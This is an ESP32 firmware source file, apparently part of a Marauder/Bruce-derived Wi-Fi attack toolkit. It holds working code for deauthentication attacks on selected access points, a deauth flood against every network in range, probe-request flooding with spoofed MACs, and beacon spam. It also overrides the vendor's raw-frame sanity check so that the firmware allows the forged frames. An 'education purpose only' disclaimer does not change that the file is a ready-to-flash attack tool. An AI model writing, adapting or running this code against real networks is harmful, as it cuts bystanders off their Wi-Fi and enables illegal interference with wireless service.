#include "wifiheader.h"

/*
    * wifi.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
	* /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
	* Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
	* Licensed under the MIT License.
*/


LinkedList<AccessPoint>* access_points;
LinkedList<AccessPoint>* deauth_flood_ap;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337)
      return 1;
    else
      return 0;
}


void WiFiModules::main() {
	if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1) {
		this->wsl_bypass_enable = true;
		Serial.println("[INFO] Wsl bypass enabled");
	}
	else {
		this->wsl_bypass_enable = false;
		Serial.println("[INFO] Wsl bypass disabled");
	}
	
    access_points = new LinkedList<AccessPoint>();
	deauth_flood_ap = new LinkedList<AccessPoint>();

	esp_wifi_init(&cfg);
	esp_wifi_set_mode(WIFI_AP_STA);
	esp_wifi_start();
	//WiFi.mode(WIFI_AP_STA);
	this->wifi_initialized = true;
	Serial.println("[INFO] WiFi initialized successfully");
	esp_wifi_get_mac(WIFI_IF_AP, this->ap_mac);
	this->setMac();
	Serial.printf("[INFO] AP MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n", 
				this->ap_mac[0], this->ap_mac[1], this->ap_mac[2],
				this->ap_mac[3], this->ap_mac[4], this->ap_mac[5]);
	this->ShutdownWiFi();
}

bool WiFiModules::ShutdownWiFi() {
	if (this->wifi_initialized) {
		esp_wifi_set_promiscuous(false);
		WiFi.disconnect();
		WiFi.mode(WIFI_OFF);

		//dst_mac = "ff:ff:ff:ff:ff:ff";

		esp_wifi_set_mode(WIFI_MODE_NULL);
		esp_wifi_stop();
		esp_wifi_restore();
		esp_wifi_deinit();
		esp_netif_deinit();
		this->wifi_initialized = false;

		Serial.println("[INFO] WiFi shutdown successfully");
		return true;
	}
	else {
		Serial.println("[ERROR] WiFi is not initialized, cannot shutdown");
		return false;
	}
}

void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
	if (attack_mode == WIFI_ATTACK_DEAUTH) {
		for (int i = 0; i < 55; i++) sendDeauthAttack();
	}
	if (attack_mode == WIFI_ATTACK_AUTH) {
		for (int i = 0; i < 55; i++) sendProbeAttack();
	}
	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
		for (int i = 0; i < 55; i++) sendBeaconRandomSSID();
	}
	else if (attack_mode == WIFI_ATTACK_STA_BEACON) {
		for (int i = 0; i < 7; i++) {
			for (int x = 0; x < (sizeof(stable_ssid_beacon)/sizeof(char *)); x++) {
				sendCustomESSIDBeacon(stable_ssid_beacon[x]);
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_RIC_BEACON) {
		for (int i = 0; i < 7; i++)
		{
			for (int x = 0; x < (sizeof(rick_roll)/sizeof(char *)); x++)
				{
					sendCustomESSIDBeacon(rick_roll[x]);
				}
		}
	}
}

void WiFiModules::StartMode(WiFiScanState mode) {
	if (mode == WIFI_SCAN_OFF) {
		if (this->wifi_initialized) this->ShutdownWiFi();
		this->packet_sent = 0;
		Serial.println("[INFO] WiFi scan mode is OFF, WiFi shutdown.");
	}
	else if (mode == WIFI_SCAN_AP) {
		this->StartAPWiFiScan();
	}
	else if (mode == WIFI_ATTACK_DEAUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Deauth] Attack!");
	}
	else if (mode == WIFI_ATTACK_DEAUTH_FLOOD) {
		this->StartDeauthFlood();
		Serial.println("[INFO] Starting [Deauth Flood] Attack!");
	}
	else if (mode == WIFI_ATTACK_AUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Probe] Attack!");
	}
	else if (mode == WIFI_ATTACK_RND_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Random Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_STA_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Staring [Stable Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_RIC_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Rick Roll Beacon] Attack!");
	}
}

void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
	ap_config.ap.ssid_hidden = 1;
	ap_config.ap.beacon_interval = 10000;
	ap_config.ap.ssid_len = 0;
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);
	esp_wifi_set_config(WIFI_IF_AP, &ap_config);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

	//WiFi.mode(WIFI_AP);
		
	//esp_wifi_init(&cfg);
	//esp_wifi_set_storage(WIFI_STORAGE_RAM);
	//esp_wifi_set_mode(WIFI_AP_STA);
	//esp_wifi_start();
	//esp_wifi_set_promiscuous_filter(NULL);
	//esp_wifi_set_promiscuous(true);
	esp_wifi_set_max_tx_power(82);
	this->packet_sent = 0;
	this->wifi_initialized = true;
	Serial.println("[INFO] WiFi re-initialized successfully");
	Serial.println("[INFO] Ready to attack!");
}

void WiFiModules::setMac() {
	wifi_mode_t currentWiFiMode;
  	esp_wifi_get_mode(&currentWiFiMode);
	esp_err_t result = esp_wifi_set_mac(WIFI_IF_AP, this->ap_mac);
	if ((result != ESP_OK) &&
      ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_NULL)))
        Serial.printf("[WARN] Failed to set AP MAC: %s | 0x%X\n", macToString(this->ap_mac).c_str(), result);
  	else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_NULL))
    	Serial.printf("[INFO] Successfully set AP MAC: %s\n", macToString(this->ap_mac).c_str());
}

void WiFiModules::changeChannel() {
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelHop() {
	this->set_channel = this->set_channel + 1;
	if (this->set_channel > 14) {
		this->set_channel = 1;
	}
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	//Serial.printf("Changed channel to %d using channel hop\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelRandom() {
	this->set_channel = (rand() % 14) + 1;
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	//Serial.printf("Channel channel to %d using channel random\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::StartDeauthFlood() {
	if (!deauth_flood_scan_one_shot) {
		delete deauth_flood_ap;
		deauth_flood_ap = new LinkedList<AccessPoint>();

		WiFi.mode(WIFI_STA);
		wifi_initialized = true;
		delay(100);

		deauth_flood_scan_one_shot = true;

		int numNetworks = WiFi.scanNetworks(false, true);

		Serial.println("[INFO] Deauth WiFi Scan Done! Total: " + String(numNetworks) + " Found!");

		for (int i = 0; i < numNetworks; i++) {
			AccessPoint ap;
			ap.essid = WiFi.SSID(i);
			ap.channel = static_cast<uint8_t>(WiFi.channel(i));
			uint8_t* bssid = WiFi.BSSID(i);
			if (bssid != nullptr) {
				memcpy(ap.bssid, bssid, 6);
			} else {
				memset(ap.bssid, 0, 6);
			}
			deauth_flood_ap->add(ap);
		}

		if (deauth_flood_ap->size() > 0) deauth_flood_found_ap = true;

		Serial.println("[INFO] Starting Deauth Flood");

		deauth_flood_redraw = true;

		this->StartWiFiAttack(WIFI_ATTACK_DEAUTH_FLOOD);
	}

	//while (!check(selPress)) {
		static unsigned long reScanCounter = 0;
		for (int i = 0; i < deauth_flood_ap->size(); i++) {
			static unsigned long lastReDrawTime = 0;
			this->set_channel = deauth_flood_ap->get(i).channel;
			changeChannel();
			memcpy(&deauth_frame_packet[10], deauth_flood_ap->get(i).bssid, 6);
			memcpy(&deauth_frame_packet[16], deauth_flood_ap->get(i).bssid, 6);
			//for (int j = 0; j < 55; j++) {
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
			//}
			if (millis() - lastReDrawTime > 500) {
				deauth_flood_redraw = true;
				deauth_flood_target = deauth_flood_ap->get(i).essid;
				vTaskDelay(1 / portTICK_PERIOD_MS);
				lastReDrawTime = millis();
			}
		}
		if (millis() - reScanCounter > 60000) {
			deauth_flood_scan_one_shot = false;
			reScanCounter = millis();
		}
	//}
}


void WiFiModules::StartAPWiFiScan() {
    delete access_points;
    access_points = new LinkedList<AccessPoint>();

    Serial.println("[INFO] Starting WiFi scan...");
    
    WiFi.mode(WIFI_STA);
	wifi_initialized = true;
    vTaskDelay(100 / portTICK_PERIOD_MS);
    
    int numNetworks = WiFi.scanNetworks(false, true, false, 1000);
    
    if (numNetworks == -1) {
        Serial.println("[ERROR] WiFi scan failed or No network found!");
        return;
    }
    
    Serial.println("[INFO] WiFi Scan Done! Total: " + String(numNetworks) + " Found!");
    
    for (int i = 0; i < numNetworks; i++) {
        AccessPoint ap;
		if (WiFi.SSID(i) == "")
			ap.essid = "<Hidden SSID>";	
		else
			ap.essid = WiFi.SSID(i);
        ap.channel = static_cast<uint8_t>(WiFi.channel(i));
        
        uint8_t* bssid = WiFi.BSSID(i);
        if (bssid != nullptr) {
            memcpy(ap.bssid, bssid, 6);
        } else {
            memset(ap.bssid, 0, 6);
        }
        ap.wpa = WiFi.encryptionType(i);
		switch (ap.wpa) {
            case WIFI_AUTH_OPEN: ap.wpastr = "Open"; break;
            case WIFI_AUTH_WEP: ap.wpastr = "WEP"; break;
            case WIFI_AUTH_WPA_PSK: ap.wpastr = "WPA/PSK"; break;
            case WIFI_AUTH_WPA2_PSK: ap.wpastr = "WPA2/PSK"; break;
            case WIFI_AUTH_WPA_WPA2_PSK: ap.wpastr = "WPA/WPA2/PSK"; break;
            case WIFI_AUTH_WPA2_ENTERPRISE: ap.wpastr = "WPA2/Enterprise"; break;
            default: ap.wpastr = "Unknown"; break;
        }
        ap.selected = false;
        ap.rssi = static_cast<int8_t>(WiFi.RSSI(i));
        access_points->add(ap);
        
        Serial.println("[INFO] Added: " + ap.essid + " (Ch:" + String(ap.channel) + ")" + " (Enc:" + ap.wpastr + ")");
    }
    
    WiFi.scanDelete();
    
    Serial.println("[INFO] Scan completed successfully! Networks in list: " + String(access_points->size()));
}

void WiFiModules::sendCustomESSIDBeacon(const char* ESSID) {
	if (!this->wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	channelRandom();

	// Randomize SRC MAC
	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);

	int ssidLen = strlen(ESSID);
	beacon_frame_packet[37] = ssidLen;

	// Insert my tag
	for(int i = 0; i < ssidLen; i++)
		beacon_frame_packet[38 + i] = ESSID[i];

	/////////////////////////////
	
	beacon_frame_packet[50 + ssidLen] = this->set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



	// Add everything that goes after the SSID
	for(int i = 0; i < 12; i++) 
		beacon_frame_packet[38 + ssidLen + i] = postSSID[i];
	

	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);

	packet_sent = packet_sent + 3;

    if (res_1 != ESP_OK)
		packet_sent -= 1;
    if (res_2 != ESP_OK)
		packet_sent -= 1;
    if (res_3 != ESP_OK)
		packet_sent -= 1;
}

void WiFiModules::sendBeaconRandomSSID() {
	if (!this->wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send beacon frame.");
		return;
	}

	channelRandom();  

	// Randomize SRC MAC
	beacon_frame_packet[10] = beacon_frame_packet[16] = random(256);
	beacon_frame_packet[11] = beacon_frame_packet[17] = random(256);
	beacon_frame_packet[12] = beacon_frame_packet[18] = random(256);
	beacon_frame_packet[13] = beacon_frame_packet[19] = random(256);
	beacon_frame_packet[14] = beacon_frame_packet[20] = random(256);
	beacon_frame_packet[15] = beacon_frame_packet[21] = random(256);

	beacon_frame_packet[37] = 6;
	
	
	// Randomize SSID (Fixed size 6. Lazy right?)
	beacon_frame_packet[38] = alfa[random(65)];
	beacon_frame_packet[39] = alfa[random(65)];
	beacon_frame_packet[40] = alfa[random(65)];
	beacon_frame_packet[41] = alfa[random(65)];
	beacon_frame_packet[42] = alfa[random(65)];
	beacon_frame_packet[43] = alfa[random(65)];
	
	beacon_frame_packet[56] = set_channel;

	uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
						0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



	// Add everything that goes after the SSID
	for(int i = 0; i < 12; i++) 
		beacon_frame_packet[38 + 6 + i] = postSSID[i];

	esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame_packet, sizeof(beacon_frame_packet), false);
	
	packet_sent = packet_sent + 1;
    if (res != ESP_OK)
        packet_sent -= 1;
}

void WiFiModules::sendDeauthAttack() {
	if (!this->wifi_initialized) {
		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
		return;
	}

	for (int i = 0; i < access_points->size(); i++) {
		// Check if active
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1/ portTICK_PERIOD_MS);
			
			// Build packet
			
			deauth_frame_packet[10] = access_points->get(i).bssid[0];
			deauth_frame_packet[11] = access_points->get(i).bssid[1];
			deauth_frame_packet[12] = access_points->get(i).bssid[2];
			deauth_frame_packet[13] = access_points->get(i).bssid[3];
			deauth_frame_packet[14] = access_points->get(i).bssid[4];
			deauth_frame_packet[15] = access_points->get(i).bssid[5];
		
			deauth_frame_packet[16] = access_points->get(i).bssid[0];
			deauth_frame_packet[17] = access_points->get(i).bssid[1];
			deauth_frame_packet[18] = access_points->get(i).bssid[2];
			deauth_frame_packet[19] = access_points->get(i).bssid[3];
			deauth_frame_packet[20] = access_points->get(i).bssid[4];
			deauth_frame_packet[21] = access_points->get(i).bssid[5];      
		
			// Send packet
		  	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);

			packet_sent = packet_sent + 3;

			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
		}
	}
}

void WiFiModules::sendProbeAttack() {
	for (int i = 0; i <access_points->size(); i++) {
		if (access_points->get(i).selected) {
			this->set_channel = access_points->get(i).channel;
			changeChannel();
			vTaskDelay(1 / portTICK_PERIOD_MS);
      
			// Build packet
			// Randomize SRC MAC
			
			probe_frame_packet[10] = random(256);
			probe_frame_packet[11] = random(256);
			probe_frame_packet[12] = random(256);
			probe_frame_packet[13] = random(256);
			probe_frame_packet[14] = random(256);
			probe_frame_packet[15] = random(256);

			// Set SSID length
			int ssidLen = access_points->get(i).essid.length();

			probe_frame_packet[25] = ssidLen;

			// Insert ESSID
			char buf[ssidLen + 1] = {};
			access_points->get(i).essid.toCharArray(buf, ssidLen + 1);
			
			for(int i = 0; i < ssidLen; i++)
				probe_frame_packet[26 + i] = buf[i];
				
			uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
									0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
									0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
									0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
									0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
									0x00, 0x00, 0x00, 0x00};

			uint8_t good_probe_req_packet[26 + ssidLen + 40] = {};
			
			for (int i = 0; i < 26 + ssidLen; i++)
				good_probe_req_packet[i] = probe_frame_packet[i];

			for(int i = 0; i < 40; i++) 
				good_probe_req_packet[26 + ssidLen + i] = postSSID[i];
			esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
			esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

			packet_sent = packet_sent + 3;

			if (res_1 != ESP_OK)
				packet_sent -= 1;
			if (res_2 != ESP_OK)
				packet_sent -= 1;
			if (res_3 != ESP_OK)
				packet_sent -= 1;
		}
	}
}